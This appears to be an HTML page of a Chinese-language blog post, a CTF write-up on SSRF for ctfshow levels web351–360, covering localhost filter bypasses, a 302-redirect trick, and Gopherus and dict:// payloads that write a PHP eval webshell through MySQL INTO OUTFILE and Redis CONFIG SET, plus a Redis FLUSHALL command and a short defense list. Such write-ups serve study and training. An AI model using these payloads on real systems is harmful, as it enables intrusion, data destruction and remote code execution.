@@ -1,0 +1,795 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MaskObito">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="相关函数和类 file_get_contents(): 将整个文件或一个url所指向的文件读入一个字符串中 readfile(): 输出一个文件的内容 fsockopen(): 打开一个网络连接或者一个Unix套接字连接 curl_exec(): 初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用 fopen(): 打">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-SSRF">
+<meta property="og:url" content="http://maskobito.github.io/2025/05/08/CTF-SSRF/index.html">
+<meta property="og:site_name" content="MaskObito">
+<meta property="og:description" content="相关函数和类 file_get_contents(): 将整个文件或一个url所指向的文件读入一个字符串中 readfile(): 输出一个文件的内容 fsockopen(): 打开一个网络连接或者一个Unix套接字连接 curl_exec(): 初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用 fopen(): 打">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/images/ef83ffd8-6690-4138-b0ea-c3e89fb72edb.png">
+<meta property="og:image" content="http://maskobito.github.io/images/04013c66533b3d3349459ead8ee70398.png">
+<meta property="og:image" content="http://maskobito.github.io/images/3e2ff866e06176a7c2e394e1d988e4ef.png">
+<meta property="og:image" content="http://maskobito.github.io/images/6375128d-bcb4-4588-ab49-722c5d334f43.png">
+<meta property="og:image" content="http://maskobito.github.io/images/d263d3d2-091c-4f61-962c-0f795ac8169e.png">
+<meta property="article:published_time" content="2025-05-07T23:51:49.000Z">
+<meta property="article:modified_time" content="2025-09-20T15:39:20.349Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/images/ef83ffd8-6690-4138-b0ea-c3e89fb72edb.png">
+  
+  
+  
+  <title>CTF-SSRF - MaskObito</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/neon.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maskobito.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[],"type":"particle"},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"language":"zh-CN","enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">MaskObito</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CTF-SSRF"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-08 07:51" pubdate>
+          2025年5月8日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CTF-SSRF</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="相关函数和类"><a href="#相关函数和类" class="headerlink" title="相关函数和类"></a>相关函数和类</h2><ul>
+<li><strong>file_get_contents()</strong>: 将整个文件或一个url所指向的文件读入一个字符串中</li>
+<li><strong>readfile()</strong>: 输出一个文件的内容</li>
+<li><strong>fsockopen()</strong>: 打开一个网络连接或者一个Unix套接字连接</li>
+<li><strong>curl_exec()</strong>: 初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close()函数使用</li>
+<li><strong>fopen()</strong>: 打开一个文件文件或者URL</li>
+<li><strong>PHP原生类SoapClient</strong>: 在触发反序列化时可导致SSRF</li>
+</ul>
+<h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><ul>
+<li><strong>file协议</strong>: 在有回显的情况下，利用file协议可以读取任意文件的内容</li>
+<li><strong>dict协议</strong>: 泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li><strong>gopher协议</strong>: gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）。可用于反弹shell</li>
+<li><strong>http&#x2F;s协议</strong>: 探测内网主机存活</li>
+</ul>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><ol>
+<li>让服务器访问相应的网址</li>
+<li>让服务器访问自己所处内网的一些敏感文件来判断是否存在相应的应用</li>
+<li>可以使用file、dict、gopher等协议进行请求访问相应的文件</li>
+<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包(payload)）</li>
+<li>攻击内网应用程序（利用跨协议通信技术）</li>
+<li>判断内网主机是否存活：方法是访问看是否有端口开放</li>
+<li>DoS攻击（请求大文件，始终保持连接keep-alive always）</li>
+</ol>
+<h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭所有错误报告，不显示任何PHP错误、警告或通知</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 高亮显示当前文件源代码（用于调试或展示代码）</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-comment">// 从POST请求中获取名为&#x27;url&#x27;的参数值</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br><span class="hljs-comment">// 初始化一个cURL会话，指定要访问的URL</span><br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><br><span class="hljs-comment">// 设置cURL选项：不包含HTTP头部信息在输出中</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 设置cURL选项：将获取的内容作为字符串返回，而不是直接输出</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 执行cURL请求，获取目标URL的内容</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><br><span class="hljs-comment">// 关闭cURL会话，释放资源</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br><span class="hljs-comment">// 输出获取到的内容</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>url传127.0.0.1发现有回显，试试看访问其目录</p>
+<p><img src="/../images/ef83ffd8-6690-4138-b0ea-c3e89fb72edb.png" srcset="/img/loading.gif" lazyload alt="ef83ffd8-6690-4138-b0ea-c3e89fb72edb"></p>
+<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><h4 id="localhost-127-0-0-1被过滤"><a href="#localhost-127-0-0-1被过滤" class="headerlink" title="localhost,127.0.0.1被过滤"></a>localhost,127.0.0.1被过滤</h4><p>IP地址在解析时，如果省略了某些部分，系统会自动用 <code>0</code> 来填充。可以用0或0.0.0.0或127.1（会解析成127.0.0.1）或127.0.1</p>
+<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/localhost|1|0|。/i&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br></code></pre></td></tr></table></figure>
+
+<h4 id="通过ip地址解析为127-0-0-1的网站进行绕过"><a href="#通过ip地址解析为127-0-0-1的网站进行绕过" class="headerlink" title="通过ip地址解析为127.0.0.1的网站进行绕过"></a>通过ip地址解析为127.0.0.1的网站进行绕过</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">spoofed.burpcollaborator.net<br><br>safe.taobao.com<br><br>sudo.cc<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">3</span>))&#123; <br></code></pre></td></tr></table></figure>
+
+<h4 id="要求ip长度小于3"><a href="#要求ip长度小于3" class="headerlink" title="要求ip长度小于3"></a>要求ip长度小于3</h4><p>用<a target="_blank" rel="noopener" href="http://0即可/">http://0即可</a></p>
+<h3 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h3><h4 id="利用个人vps实现302跳转"><a href="#利用个人vps实现302跳转" class="headerlink" title="利用个人vps实现302跳转"></a>利用个人vps实现302跳转</h4><p>攻击者诱使<strong>服务器端</strong>应用向攻击者指定的内部或外部地址发起HTTP请求。关键在于，这个请求是从<strong>目标服务器</strong>发出的，而不是从攻击者的浏览器发出的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>header()</code> 函数</strong>： 这是PHP中用于发送原始HTTP头部的函数。</li>
+<li><strong><code>Location:</code> 头部</strong>： 这是一个特殊的HTTP响应头。当浏览器或任何HTTP客户端收到一个包含 <code>Location</code> 头的响应时，它会<strong>自动</strong>向该头指定的新URL发起一个新的GET请求。这就是所谓的“HTTP重定向”。</li>
+<li><strong>状态码 302</strong>： 虽然代码中没有明确写，但 <code>header(&quot;Location: ...&quot;)</code> 默认会发送 <strong>302 Found</strong> 状态码（除非之前用 <code>header(&quot;HTTP/1.1 301 Moved Permanently&quot;)</code> 指定了其他状态码）。302表示“临时重定向”。</li>
+</ul>
+<p>访问url&#x3D;<a target="_blank" rel="noopener" href="http://ip/ssrf.php%E5%8D%B3%E5%8F%AF%E3%80%82">http://ip/ssrf.php即可。</a></p>
+<h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>); <br></code></pre></td></tr></table></figure>
+
+<h4 id="需要以ctf开头，show结尾"><a href="#需要以ctf开头，show结尾" class="headerlink" title="需要以ctf开头，show结尾"></a>需要以ctf开头，show结尾</h4><p>一个完整的URL遵循以下语法：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]<br></code></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">http://admin:pass123@example.com/dashboard<br></code></pre></td></tr></table></figure>
+
+<p>这表示使用用户名 <code>admin</code> 和密码 <code>pass123</code> 访问 <code>example.com</code> 的 <code>/dashboard</code>。</p>
+<p>可用：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><br>url=http://ctf.@127.0.0.1/flag.php#show<br><br>url=http://ctf.@127.0.0.1/flag.php?show<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><h4 id="SSRF攻击利用Gopher协议实现MySQL写入WebShell"><a href="#SSRF攻击利用Gopher协议实现MySQL写入WebShell" class="headerlink" title="SSRF攻击利用Gopher协议实现MySQL写入WebShell"></a>SSRF攻击利用Gopher协议实现MySQL写入WebShell</h4><p>首先分析拿到的PHP代码，存在SSRF漏洞：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;returl&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;returl&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file|dict/i&quot;</span>,<span class="hljs-variable">$url</span>))&#123;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">_request</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$url</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>有简单的过滤，禁止包含”file”或”dict”的URL</li>
+<li>但未过滤其他危险协议如<code>gopher://</code></li>
+</ol>
+<p><strong>攻击原理与步骤</strong></p>
+<p><strong>第一步：选择Gopher协议绕过过滤</strong></p>
+<p>Gopher协议是一个古老的网络协议，可以用于构造各种网络请求。由于代码没有过滤gopher协议，我们可以利用它来与MySQL服务器进行交互。</p>
+<p><strong>第二步：使用Gopherus工具生成Payload</strong></p>
+<p>Gopherus是一款专门生成Gopher协议Payload的工具，可以用于攻击多种服务，包括MySQL。</p>
+<p>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python gopherus.py --exploit mysql<br></code></pre></td></tr></table></figure>
+
+<p>输入MySQL命令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd">root<br>select &#x27;&lt;?php eval($_POST[&#x27;<span class="hljs-built_in">cmd</span>&#x27;]);?&gt;&#x27; into outfile &#x27;/var/www/html/<span class="hljs-built_in">cmd</span>.php&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p><strong>第三步：理解MySQL协议交互</strong></p>
+<p>Gopherus生成的Payload实际上模拟了MySQL客户端与服务器的完整认证和查询过程：</p>
+<ol>
+<li><strong>TCP三次握手</strong>：建立与MySQL服务器的连接</li>
+<li><strong>协议握手</strong>：服务器发送初始握手包，客户端响应认证信息</li>
+<li><strong>认证过程</strong>：使用提供的用户名(此处为root)进行认证</li>
+<li><strong>查询执行</strong>：发送SQL查询语句select…</li>
+</ol>
+<p><strong>第四步：理解SELECT…INTO OUTFILE</strong></p>
+<ul>
+<li><code>SELECT &#39;&#39;</code>：选择一个空字符串</li>
+<li><code>INTO OUTFILE &#39;/var/www/html/cmd.php&#39;</code>：将结果写入指定文件</li>
+<li>这会在Web目录中创建一个名为<code>cmd.php</code>的文件，内容为空</li>
+</ul>
+<p><strong>第五步：URL编码的重要性</strong></p>
+<p>Gopher协议要求特殊字符进行URL编码，因为：</p>
+<ol>
+<li>Gopher协议使用特定字符作为分隔符（如Tab字符<code>%09</code>）</li>
+<li>某些字符在URL中有特殊含义，需要编码避免解析错误，后面的%会进行URL解码</li>
+<li>MySQL协议中包含二进制数据，必须正确编码</li>
+</ol>
+<p><strong>第六步：完整的攻击流程</strong></p>
+<ol>
+<li><p>使用Gopherus生成Payload</p>
+</li>
+<li><p>对Payload进行URL编码</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">gopher://127.0.0.1:3306/<span class="hljs-title">_</span>%<span class="hljs-title">a3</span>%00%00%01%85%<span class="hljs-title">a6</span>%<span class="hljs-title">ff</span>%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%</span><br></code></pre></td></tr></table></figure>
+
+<p>只对 _ 后面部分进行url编码</p>
+</li>
+<li><p>通过POST请求发送到漏洞端点：<code>returl=gopher%3A%2F%2F...</code>（编码后的内容）</p>
+<p><img src="/../images/04013c66533b3d3349459ead8ee70398.png" srcset="/img/loading.gif" lazyload alt="04013c66533b3d3349459ead8ee70398"></p>
+</li>
+<li><p>服务器执行SSRF请求，连接到MySQL服务器并执行SQL语句</p>
+<p>成功时，url&#x2F;bit.php页面如下</p>
+<p><img src="/../images/3e2ff866e06176a7c2e394e1d988e4ef.png" srcset="/img/loading.gif" lazyload alt="3e2ff866e06176a7c2e394e1d988e4ef"></p>
+</li>
+<li><p>MySQL将WebShell写入Web目录</p>
+</li>
+<li><p>攻击者访问<code>http://target/cmd.php</code>获取Shell</p>
+</li>
+</ol>
+<p><strong>防御措施</strong></p>
+<ol>
+<li>严格限制允许的URL协议（只允许http&#x2F;https）</li>
+<li>使用白名单验证用户输入的URL</li>
+<li>对输出文件路径进行严格限制</li>
+<li>网络隔离，确保数据库服务器不直接暴露给外部</li>
+<li>使用最小权限原则运行数据库服务</li>
+</ol>
+<p>这种攻击成功的关键在于SSRF漏洞与MySQL的<code>INTO OUTFILE</code>功能结合，允许攻击者向Web目录写入任意文件，从而获得远程代码执行能力。</p>
+<h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><h4 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python gopherus.py --exploit redis<br><br>Ready To get SHELL<br><br>What <span class="hljs-keyword">do</span> you want?? (ReverseShell/PHPShell): php<br><br>Give web root location of server (default is /var/www/html):<br>Give PHP Payload (We have default PHP Shell): &lt;?php eval($_POST[<span class="hljs-built_in">cmd</span>]);?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>编码后传参，访问shell.php（默认）即可</p>
+<h4 id="dict协议打redis"><a href="#dict协议打redis" class="headerlink" title="dict协议打redis"></a>dict协议打redis</h4><p>先用info语句测试是否能用dict</p>
+<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">url<span class="hljs-operator">=</span><span class="hljs-built_in">dict</span><span class="hljs-operator">:</span><span class="hljs-comment">//127.0.0.1:6379/info</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/6375128d-bcb4-4588-ab49-722c5d334f43.png" srcset="/img/loading.gif" lazyload alt="6375128d-bcb4-4588-ab49-722c5d334f43"></p>
+<p>清空数据库</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">dict://127.0.0.1:6379/FLUSHALL<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/d263d3d2-091c-4f61-962c-0f795ac8169e.png" srcset="/img/loading.gif" lazyload alt="d263d3d2-091c-4f61-962c-0f795ac8169e"></p>
+<p>后面按照格式即可，需url编码</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cmd">FLUSHALL //可不写<br><span class="hljs-built_in">SET</span> shell &quot;&lt;?php eval($_POST[&#x27;<span class="hljs-built_in">cmd</span>&#x27;]); ?&gt;&quot; //设置键值对，值为 WebShell<br>CONFIG <span class="hljs-built_in">SET</span> <span class="hljs-built_in">dir</span> /var/www/html //设置保存目录<br>CONFIG <span class="hljs-built_in">SET</span> dbfilename shell.php //设置文件名<br>SAVE //保存<br></code></pre></td></tr></table></figure>
+
+<p>第二步木马需要用十六进制hex编码，to hex加上\x即可</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">SET:<span class="hljs-title">shell</span>:&quot;\<span class="hljs-title">x3c</span>\<span class="hljs-title">x3f</span>\<span class="hljs-title">x70</span>\<span class="hljs-title">x68</span>\<span class="hljs-title">x70</span>\<span class="hljs-title">x20</span>\<span class="hljs-title">x65</span>\<span class="hljs-title">x76</span>\<span class="hljs-title">x61</span>\<span class="hljs-title">x6c</span>\<span class="hljs-title">x28</span>\<span class="hljs-title">x24</span>\<span class="hljs-title">x5f</span>\<span class="hljs-title">x50</span>\<span class="hljs-title">x4f</span>\<span class="hljs-title">x53</span>\<span class="hljs-title">x54</span>\<span class="hljs-title">x5b</span>\<span class="hljs-title">x27</span>\<span class="hljs-title">x63</span>\<span class="hljs-title">x6d</span>\<span class="hljs-title">x64</span>\<span class="hljs-title">x27</span>\<span class="hljs-title">x5d</span>\<span class="hljs-title">x29</span>\<span class="hljs-title">x3b</span>\<span class="hljs-title">x3f</span>\<span class="hljs-title">x3e</span>&quot; </span><br></code></pre></td></tr></table></figure>
+
+<p>成功回显：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">-ERR Unknown subcommand or wrong number of arguments for &#x27;libcurl&#x27;. Try CLIENT HELP +OK +OK <br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h2><p>file_get_contents()函数的一个特性，即当PHP的file_get_contents()函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上<br>跳转目录即可读到根目录的文件。(include()函数也有类似的特性）</p>
+<p>例如：</p>
